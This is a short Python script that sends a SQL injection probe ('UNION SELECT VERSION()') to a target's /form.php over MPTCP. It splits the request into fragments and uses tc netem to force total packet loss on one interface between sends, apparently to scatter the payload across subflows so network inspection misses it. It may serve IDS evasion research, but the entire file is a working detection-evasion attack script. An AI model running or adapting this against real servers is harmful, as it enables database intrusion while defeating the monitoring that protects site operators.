import socket
import sys
import time
import os

req1 = b"GET /form.php?q=1+UNION+SELE"
req2 = b"CT+"
req3 = f"VERSION%28%29 HTTP/1.1\r\nHost: {sys.argv[1]}\r\n\r\n".encode()

for i in range(100):
    sock = socket.socket(
        socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_MPTCP
    )
    sock.connect((sys.argv[1], 80))

    sock.send(req1)

    time.sleep(1)

    # Introduce packet loss in the 1st interface used
    os.system("tc qdisc add dev {} root netem loss 100%".format(sys.argv[2]))

    sock.send(req2)

    time.sleep(1)

    sock.send(req3)

    sock.recv(2048)

    sock.close()

    # Remove packet loss
    os.system("tc qdisc del dev {} root netem loss 100%".format(sys.argv[2]))
